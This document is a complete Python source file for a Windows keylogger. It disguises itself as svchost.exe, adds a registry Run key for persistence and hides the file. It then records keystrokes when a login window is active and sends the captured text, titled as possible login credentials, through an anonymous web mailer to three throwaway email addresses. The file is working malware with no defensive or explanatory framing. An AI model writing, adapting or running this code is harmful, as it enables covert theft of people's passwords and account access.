import pythoncom, pyHook, os, sys, win32gui, time, mechanize, subprocess, thread


logs = str()

worm = os.path.split(sys.argv[0])[1]

subprocess.call("copy "+worm+" %userprofile%\\svchost.exe", shell=True)
subprocess.call("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v Svchost /d %userprofile%\\svchost.exe", shell=True)
subprocess.call("attrib +s +r +h %userprofile%\\svchost.exe", shell=True)

def stop():
    time.sleep(60 * 30)
    sys.exit()
    
def send_mail(to, message):
    br = mechanize.Browser()
 
    subject = "Possible Captured Login Credentials"
          
    url = "http://anonymouse.org/anonemail.html"
    headers = "Mozilla/4.0 (compatible; MSIE 5.0; AOL 4.0; Windows 95; c_athome)"
    br.addheaders = [('User-agent', headers)]
    br.open(url)
    br.set_handle_equiv(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)
    br.set_debug_http(False)
    br.set_debug_redirects(False)

     
    br.select_form(nr=0)
     
    br.form['to'] = to
    br.form['subject'] = subject
    br.form['text'] = message
     
    result = br.submit()
     
    response = br.response().read()

    if "The e-mail has been sent anonymously!" in response:
        try:
            os.remove("logs.txt")
        except:
            pass

        thread.start_new_thread(stop, ())
    else:
        return
     

def OnKeyboardEvent(event):
        global logs

        g = open("logs.txt", "a")
        if event.KeyID == 5:
            g.close()
            sys.exit()
        elif event.KeyID == 8:
            logs = "[BACKSPACE]"
        elif event.KeyID == 9:
            logs = "[TAB]"
        elif event.KeyID == 13:
            logs = "[ENTER]"
        elif event.KeyID == 37:
            logs = "[LEFT]"
        elif event.KeyID == 38:
            logs = "[UP]"
        elif event.KeyID == 39:
            logs = "[RIGHT]"
        elif event.KeyID == 40:
            logs = "[DOWN]"
        else:
            logs = chr(event.Ascii)
        g.write(logs)
        g.close()

        d = open("logs.txt", "r")
        data = d.read()
        d.close()

        if len(data) >= 500:
            try:
                send_mail("addicted123@sharklaser.com", data)
                send_mail("addicted123@mailinator.com", data)
                send_mail("addicted123@yopmail.com", data)
            except:
                pass
            

def fbk_main():
    if os.path.exists("logs.txt") == False:
        f = open("logs.txt", "w")
        f.close()
    
    hm = pyHook.HookManager()
    hm.KeyDown = OnKeyboardEvent
    hm.HookKeyboard()

    pythoncom.PumpMessages()



while True:
    w = win32gui
    w_name = w.GetWindowText(w.GetForegroundWindow())

    if "log in" or "sign in" in w_name.lower():
        fbk_main()

    time.sleep(5)
            
